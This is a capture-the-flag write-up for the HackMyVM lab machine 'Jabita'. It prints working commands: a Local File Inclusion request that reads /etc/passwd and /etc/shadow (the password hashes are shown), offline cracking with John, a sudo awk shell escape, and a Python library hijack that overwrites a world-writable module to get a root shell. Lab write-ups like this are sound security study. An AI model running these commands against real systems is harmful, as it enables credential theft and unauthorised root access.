# Jabita

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Jabita | RiJaba1 | Beginner | HackMyVM |

**Summary:** The Jabita machine presents a layered attack path rooted in a classic Local File Inclusion (LFI) vulnerability in a PHP web application. The `index.php` script naively includes a file based on a user-supplied `page` parameter with no sanitization whatsoever, allowing an unauthenticated attacker to read arbitrary files on the system — including the sensitive `/etc/shadow` file. The SHA-512 password hash for the user `jack` is recovered via this LFI and subsequently cracked offline using John the Ripper against the RockYou wordlist. Once on the machine as `jack`, a misconfigured `sudo` rule permits execution of `/usr/bin/awk` as the user `jaba` without a password. Using the well-documented GTFOBins technique for `awk`, a shell is spawned as `jaba`. The final escalation to `root` exploits a Python library hijacking vulnerability: `jaba` is permitted to run a specific Python script as root via `sudo`, and that script imports a third-party module (`wild`) whose backing file on disk is world-writable. Overwriting the module with a malicious payload that spawns a shell results in a full root compromise.

---

## Reconnaissance

### Host Discovery

The engagement began with a network sweep of the local subnet `192.168.100.0/24` using a custom PowerShell scanning script. A single virtual target was identified.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.151 08:00:27:B7:45:A0 VirtualBox
```

The MAC address prefix `08:00:27` is a well-known VirtualBox OUI, confirming this is the target VM. The IP `192.168.100.151` was assigned to the variable `IP` for use throughout the assessment.

### Port and Service Scanning

A full-port Nmap scan with service and version detection was run against the target.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jabita]
└─$ nmap -sC -sV -p- -T4 192.168.100.151
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-08 06:04 WIB
Nmap scan report for 192.168.100.151
Host is up (0.0019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 00:b0:03:d3:92:f8:a0:f9:5a:93:20:7b:f8:0a:aa:da (ECDSA)
|_  256 dd:b4:26:1d:0c:e7:38:c3:7a:2f:07:be:f8:74:3e:bc (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.77 seconds
```

Only two ports are exposed: SSH on port 22 (OpenSSH 8.9p1) and HTTP on port 80 (Apache 2.4.52 on Ubuntu). There is no immediately apparent attack surface on SSH without credentials, so the HTTP service became the primary focus.

### Web Application Enumeration

A `curl` request to the web root confirmed a minimal placeholder page.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jabita]
└─$ IP=192.168.100.151

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jabita]
└─$ curl -i http://$IP
HTTP/1.1 200 OK
Date: Sat, 07 Mar 2026 23:10:17 GMT
Server: Apache/2.4.52 (Ubuntu)
Last-Modified: Thu, 01 Sep 2022 14:59:44 GMT
ETag: "3e-5e79edd28eef7"
Accept-Ranges: bytes
Content-Length: 62
Content-Type: text/html

<h1 style="text-align:center">We're building our future.</h1>
```

The page contains nothing actionable, so directory and file brute-forcing was performed using `feroxbuster` with a broad set of extensions to maximize coverage.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jabita]
└─$ feroxbuster -u http://$IP/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x txt,php,html,js,css,jpg,zip,bak,pem,log,png

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.151/
 🚩  In-Scope Url          │ 192.168.100.151
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, html, js, css, jpg, zip, bak, pem, log, png]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        5w       62c http://192.168.100.151/
200      GET        1l        5w       62c http://192.168.100.151/index.html
301      GET        9l       28w      321c http://192.168.100.151/building => http://192.168.100.151/building/
200      GET       10l      202w     1406c http://192.168.100.151/building/contact.php
500      GET       13l       29w      508c http://192.168.100.151/building/index.php
200      GET        4l       30w      219c http://192.168.100.151/building/gallery.php
```

The scan revealed a `/building/` subdirectory containing three PHP pages. The `index.php` returned HTTP 500 (Internal Server Error), which is unusual and warrants deeper investigation. Probing its raw HTML response showed exactly why it was broken and also exposed a critical design flaw.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jabita]
└─$ curl -i http://$IP/building/index.php
HTTP/1.0 500 Internal Server Error
Date: Sat, 07 Mar 2026 23:18:07 GMT
Server: Apache/2.4.52 (Ubuntu)
Content-Length: 508
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
        <body>
                 <div class="w3-bar w3-black">
                  <a href="/building/index.php?page=home.php" class="w3-bar-item w3-button">Home</a>
                  <a href="/building/index.php?page=gallery.php" class="w3-bar-item w3-button">Gallery</a>
                  <a href="/building/index.php?page=contact.php" class="w3-bar-item w3-button">Contact</a>
                </div>
        </body>
</html>
```

The navigation links embedded in the HTML reveal the mechanism: the application uses a `?page=` GET parameter to dynamically include files. The server throws a 500 error when no parameter is provided (because it attempts to include a null or undefined filename), but the links themselves confirm the pattern `index.php?page=<filename>`. This is a textbook Local File Inclusion setup. The other two pages were confirmed to be standard placeholder content.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jabita]
└─$ curl -i http://$IP/building/contact.php
HTTP/1.1 200 OK
Date: Sat, 07 Mar 2026 23:19:15 GMT
Server: Apache/2.4.52 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1406
Content-Type: text/html; charset=UTF-8

<div>
        <p>Email: test@jabita.corp</p>
        <p>Direction: Your computer</p>
</div>

<div>
        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed erat sem, lobortis sed elit sed, luctus suscipit metus. Pellentesque ut nisi at ipsum pulvinar tempor. Suspendisse tincidunt est eget dolor pulvinar vehicula. Etiam ut hendrerit metus. Quisque tempus, ante mollis pharetra iaculis, felis risus tempus magna, vitae tempor odio diam ut felis. Donec vitae dolor neque. Fusce eros nibh, placerat elementum pellentesque sed, imperdiet id arcu. Sed massa justo, tristique nec mollis eget, cursus nec nisl. Sed vel nulla sed ipsum elementum consectetur. Morbi tincidunt lacinia leo.</p>

        <p>Aenean sed sollicitudin justo, sed pretium arcu. Etiam id massa tortor. Quisque ut erat et dui luctus condimentum ac ac nibh. Nam sit amet tempus tellus. Quisque maximus nibh eget pretium fringilla. Aliquam eget tortor ac nibh fringilla posuere et molestie sem. Nullam at ullamcorper lectus. Suspendisse ante eros, mattis non tellus eget, rhoncus pellentesque mi. Cras quis lobortis purus. Nulla viverra orci id ante dapibus tristique. In hac habitasse platea dictumst. Donec bibendum leo quis elit feugiat placerat. Integer non molestie sapien. Vivamus commodo sodales risus dapibus convallis. Maecenas scelerisque ultrices lectus at venenatis. Sed lacus nisl, condimentum id finibus sit amet, congue id nisl.</p>
</div>

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jabita]
└─$ curl -i http://$IP/building/gallery.php
HTTP/1.1 200 OK
Date: Sat, 07 Mar 2026 23:19:22 GMT
Server: Apache/2.4.52 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 219
Content-Type: text/html; charset=UTF-8

<div>
        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam eget malesuada justo. Nullam eget scelerisque ex. Donec ullamcorper tempus purus sit amet accumsan. Phasellus eu.</p>
        <h3>Here a photo</h3>
</div>
```

The contact page also leaks the domain name `jabita.corp`. Neither `contact.php` nor `gallery.php` present any exploitable surface on their own.

---

## Initial Access

### Local File Inclusion to Credential Harvesting

With the `?page=` parameter confirmed as the inclusion vector, the first test was to request an absolute path to a known-sensitive file, `/etc/passwd`, with no path traversal sequences required since the parameter appears to accept full paths directly.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jabita]
└─$ curl -s "http://192.168.100.151/building/index.php?page=/etc/passwd"
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
jack:x:1001:1001::/home/jack:/bin/bash
jaba:x:1002:1002::/home/jaba:/bin/bash
```

The PHP process (running as `www-data`) had read access to `/etc/passwd`. Two non-system users with interactive bash shells were identified: `jack` (UID 1001) and `jaba` (UID 1002). The critical next step was to attempt reading `/etc/shadow` — which would only succeed if the web server process had been granted unusual read permissions on that file.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jabita]
└─$ curl -s "http://192.168.100.151/building/index.php?page=/etc/shadow"
...
root:$y$j9T$avXO7BCR5/iCNmeaGmMSZ0$gD9m7w9/zzi1iC9XoaomnTHTp0vde7smQL1eYJ1V3u1:19240:0:99999:7:::
daemon:*:19213:0:99999:7:::
bin:*:19213:0:99999:7:::
sys:*:19213:0:99999:7:::
sync:*:19213:0:99999:7:::
games:*:19213:0:99999:7:::
man:*:19213:0:99999:7:::
lp:*:19213:0:99999:7:::
mail:*:19213:0:99999:7:::
news:*:19213:0:99999:7:::
uucp:*:19213:0:99999:7:::
proxy:*:19213:0:99999:7:::
www-data:*:19213:0:99999:7:::
backup:*:19213:0:99999:7:::
list:*:19213:0:99999:7:::
irc:*:19213:0:99999:7:::
gnats:*:19213:0:99999:7:::
nobody:*:19213:0:99999:7:::
_apt:*:19213:0:99999:7:::
systemd-network:*:19213:0:99999:7:::
systemd-resolve:*:19213:0:99999:7:::
messagebus:*:19213:0:99999:7:::
systemd-timesync:*:19213:0:99999:7:::
pollinate:*:19213:0:99999:7:::
sshd:*:19213:0:99999:7:::
syslog:*:19213:0:99999:7:::
uuidd:*:19213:0:99999:7:::
tcpdump:*:19213:0:99999:7:::
tss:*:19213:0:99999:7:::
landscape:*:19213:0:99999:7:::
usbmux:*:19236:0:99999:7:::
lxd:!:19236::::::
jack:$6$xyz$FU1GrBztUeX8krU/94RECrFbyaXNqU8VMUh3YThGCAGhlPqYCQryXBln3q2J2vggsYcTrvuDPTGsPJEpn/7U.0:19236:0:99999:7:::
jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1:19240:0:99999:7:::
```

The `/etc/shadow` file was fully readable, which is an extreme misconfiguration — the `shadow` group or world-readable permissions must have been inadvertently set on this file. Critically, `jack`'s hash uses the `$6$` prefix, which corresponds to **SHA-512crypt** — a format that John the Ripper handles efficiently. The `root` and `jaba` hashes use the `$y$` prefix (yescrypt), which is considerably more resistant to brute-forcing, making `jack`'s SHA-512crypt hash the prime target.

### Offline Password Cracking

The recovered data was saved locally and combined using `unshadow` to produce a format suitable for John the Ripper.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jabita]
└─$ vim passwd

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jabita]
└─$ vim shadow

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jabita]
└─$ unshadow passwd shadow > unshadowed
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jabita]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
j[REDACTED]         (jack)
1g 0:00:00:01 DONE (2026-03-08 06:43) 0.6134g/s 2512p/s 2512c/s 2512C/s energy..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

John cracked the hash for `jack` in approximately one second. The password appears in the RockYou list, confirming it is a commonly used weak password.

### SSH Access as `jack`

With the cracked credentials, an SSH session was established.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jabita]
└─$ ssh jack@$IP
...
jack@jabita:~$ id ; ls -la
uid=1001(jack) gid=1001(jack) groups=1001(jack)
total 28
drwxr-x--- 3 jack jack 4096 Sep  5  2022 .
drwxr-xr-x 4 root root 4096 Sep  1  2022 ..
-rw-r--r-- 1 jack jack  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 jack jack 3771 Jan  6  2022 .bashrc
drwx------ 2 jack jack 4096 Sep  1  2022 .cache
-rw-r--r-- 1 jack jack  807 Jan  6  2022 .profile
-rw------- 1 jack jack  558 Sep  1  2022 .viminfo
```

A foothold was established as `jack`. The home directory contains no flags or sensitive data of immediate use, so privilege escalation enumeration began immediately.

---

## Privilege Escalation

### Stage 1 — `jack` → `jaba` via `sudo awk`

Checking `jack`'s sudo permissions was the first enumeration step.

```bash
jack@jabita:~$ which sudo
/usr/bin/sudo
jack@jabita:~$ sudo -l
Matching Defaults entries for jack on jabita:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, listpw=never

User jack may run the following commands on jabita:
    (jaba : jaba) NOPASSWD: /usr/bin/awk
```

The sudo rule allows `jack` to execute `/usr/bin/awk` as the user `jaba` without supplying any password. The `awk` binary is well-known on GTFOBins as a trivial shell escape vehicle. Consulting GTFOBins confirmed the exact technique:

![](image.png)

As shown in the GTFOBins entry, `awk` is an alias of `mawk` on this system and falls under the **Shell**, **File write**, and **File read** categories. The Sudo tab explicitly notes that "this function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped," and provides the payload `mawk 'BEGIN {system("/bin/sh")}'`. Adapting this to use `/bin/bash` for a more capable shell:

```bash
jack@jabita:~$ sudo -u jaba /usr/bin/awk 'BEGIN {system("/bin/bash")}'
jaba@jabita:/home/jack$ cd
jaba@jabita:~$ id ; ls -la
uid=1002(jaba) gid=1002(jaba) groups=1002(jaba)
total 44
drwxr-x--- 5 jaba jaba 4096 Sep  5  2022 .
drwxr-xr-x 4 root root 4096 Sep  1  2022 ..
-rw-r--r-- 1 jaba jaba  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 jaba jaba 3771 Jan  6  2022 .bashrc
drwx------ 2 jaba jaba 4096 Sep  1  2022 .cache
-rw------- 1 jaba jaba   72 Sep  5  2022 .lesshst
drwxr-xr-x 3 jaba jaba 4096 Sep  1  2022 .local
-rw-r--r-- 1 jaba jaba  807 Jan  6  2022 .profile
-rw------- 1 jaba jaba  122 Sep  5  2022 .python_history
drwx------ 2 jaba jaba 4096 Sep  1  2022 .ssh
-r--r----- 1 jaba jaba   33 Sep  1  2022 user.txt
```

Shell escalation to `jaba` was successful. The `user.txt` flag is now readable, and the presence of `.python_history` is an early hint that Python activity is significant for this user.

### Stage 2 — `jaba` → `root` via Python Library Hijacking

Checking `jaba`'s sudo rules revealed the path to root.

```bash
jaba@jabita:~$ sudo -l
Matching Defaults entries for jaba on jabita:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, listpw=never

User jaba may run the following commands on jabita:
    (root) NOPASSWD: /usr/bin/python3 /usr/bin/clean.py
jaba@jabita:~$ file /usr/bin/clean.py
/usr/bin/clean.py: ASCII text
jaba@jabita:~$ ls -la /usr/bin/clean.py
-rw-r--r-- 1 root root 26 Sep  5  2022 /usr/bin/clean.py
jaba@jabita:~$ cat /usr/bin/clean.py
import wild

wild.first()
```

The script itself is owned by root and not directly writable. However, it imports a non-standard module named `wild`. The critical question is: where does Python resolve this module from, and who owns that file?

```bash
jaba@jabita:~$ ls -la /usr/bin/python3
lrwxrwxrwx 1 root root 10 Mar 25  2022 /usr/bin/python3 -> python3.10
jaba@jabita:~$ ls -la /usr/bin/python3.10
-rwxr-xr-x 1 root root 5905480 Jun 29  2022 /usr/bin/python3.10
jaba@jabita:~$ python3 -c "import wild; print(wild.__file__)"
/usr/lib/python3.10/wild.py
jaba@jabita:~$ ls -la /usr/lib/python3.10/wild.py
-rw-r--rw- 1 root root 29 Sep  5  2022 /usr/lib/python3.10/wild.py
```

This is the key finding. The file `/usr/lib/python3.10/wild.py` has permissions `-rw-r--rw-` — the **world-writable** bit is set (`o+w`). This means any user on the system, including `jaba`, can overwrite the contents of this file. Since `clean.py` is executed as **root** via `sudo`, any code injected into `wild.py` will run with root privileges when `clean.first()` is called.

The exploit is straightforward: overwrite `wild.py` with a new definition of `first()` that spawns a shell, then invoke the sudo rule.

```bash
jaba@jabita:~$ echo -e 'import os\n\ndef first():\n    os.system("/bin/bash")' > /usr/lib/python3.10/wild.py
jaba@jabita:~$ sudo /usr/bin/python3 /usr/bin/clean.py
root@jabita:/home/jaba# cd
root@jabita:~# id ; whoami; hostname
uid=0(root) gid=0(root) groups=0(root)
root
jabita
root@jabita:~# cat /home/jaba/user.txt /root/root.txt
2e0[REDACTED]
f4b[REDACTED]
```

Root access was achieved. The `echo -e` command wrote a syntactically valid Python module to `wild.py`, redefining `first()` to call `os.system("/bin/bash")`. When `sudo /usr/bin/python3 /usr/bin/clean.py` was executed, Python imported the now-malicious `wild` module and called `first()`, which spawned a root shell.

---

## Attack Chain Summary

1. **Reconnaissance**: Nmap full-port scan identified two services — SSH (22) and HTTP (80, Apache 2.4.52). Feroxbuster discovered a `/building/` directory containing three PHP files, with `index.php` exposing a `?page=` inclusion parameter.

2. **Vulnerability Discovery**: The `index.php?page=` parameter was found to perform unsanitized file inclusion, allowing absolute file paths to be passed directly. A test against `/etc/passwd` confirmed the LFI, and `/etc/shadow` was subsequently read due to an insecure world-readable (or incorrectly permissioned) shadow file.

3. **Exploitation**: The SHA-512crypt hash for user `jack` was extracted from `/etc/shadow`, combined with `/etc/passwd` via `unshadow`, and cracked in under two seconds using John the Ripper against the RockYou wordlist. SSH access as `jack` was established with the recovered credentials.

4. **Internal Enumeration**: As `jack`, `sudo -l` revealed a NOPASSWD rule permitting execution of `/usr/bin/awk` as user `jaba`. The GTFOBins `awk` shell escape (`awk 'BEGIN {system("/bin/bash")}'`) was used to pivot to `jaba`. As `jaba`, `sudo -l` revealed a NOPASSWD rule to run `/usr/bin/python3 /usr/bin/clean.py` as root. Inspection of `clean.py` showed it imported a custom module `wild`, resolved to `/usr/lib/python3.10/wild.py`.

5. **Privilege Escalation**: The file `/usr/lib/python3.10/wild.py` was found to be world-writable (`-rw-r--rw-`). It was overwritten with a malicious Python module redefining `first()` to spawn `/bin/bash`. Executing `sudo /usr/bin/python3 /usr/bin/clean.py` triggered the payload under root context, granting a full root shell and both flags.
